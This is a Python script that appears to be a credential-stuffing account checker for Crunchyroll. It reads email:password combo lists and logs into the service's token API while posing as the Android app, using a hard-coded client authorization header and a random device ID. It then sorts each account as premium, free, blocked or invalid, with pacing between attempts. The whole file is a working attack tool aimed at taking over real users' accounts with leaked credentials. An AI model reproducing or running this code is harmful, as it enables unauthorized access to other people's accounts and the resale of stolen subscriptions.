import aiohttp
import random
import logging
import asyncio

# Generate a random device ID
device_id = ''.join(random.choice('0123456789abcdef') for _ in range(32))

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

async def fetch(session, combo):
    """
    Perform an asynchronous HTTP request to the Crunchyroll API to check the combo.
    """
    email, pasw = combo.split(':')
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    headers = {
        "host": "beta-api.crunchyroll.com",
        "authorization": "Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=",
        "x-datadog-sampling-priority": "0",
        "etp-anonymous-id": "855240b9-9bde-4d67-97bb-9fb69aa006d1",
        "content-type": "application/x-www-form-urlencoded",
        "accept-encoding": "gzip",
        "user-agent": "Crunchyroll/3.59.0 Android/14 okhttp/4.12.0"
    }
    data = {
        "username": email,
        "password": pasw,
        "grant_type": "password",
        "scope": "offline_access",
        "device_id": device_id,
        "device_name": "SM-G9810",
        "device_type": "samsung SM-G955N"
    }

    try:
        async with session.post(url, headers=headers, data=data) as response:
            response_text = await response.text()
            logging.info(f"API Response for {email}: {response_text}")

            if response.status == 200:
                if "account content mp:limited offline_access" in response_text:
                    return email, pasw, "No Plan ☹️"
                elif "account content mp offline_access reviews talkbox" in response_text:
                    return email, pasw, "Premium❇️"
                elif "406 Not Acceptable" in response_text:
                    return email, pasw, "Blocked🚫"
            return email, pasw, "Bad❌️"
    except Exception as e:
        logging.error(f"API Request Error: {e}")
        return email, pasw, f"Error: {str(e)}"

async def process_combos(combos):
    """
    Process a list of email:password combos and return the results.
    """
    results = []
    async with aiohttp.ClientSession() as session:
        for combo in combos:
            if ':' in combo:
                try:
                    result = await fetch(session, combo)
                    results.append(result)
                    await asyncio.sleep(2)  # Add a 2-second delay between requests
                except Exception as e:
                    logging.error(f"Error processing combo {combo}: {e}")
                    results.append((combo.split(':')[0], combo.split(':')[1], f"Error: {str(e)}"))
    return results
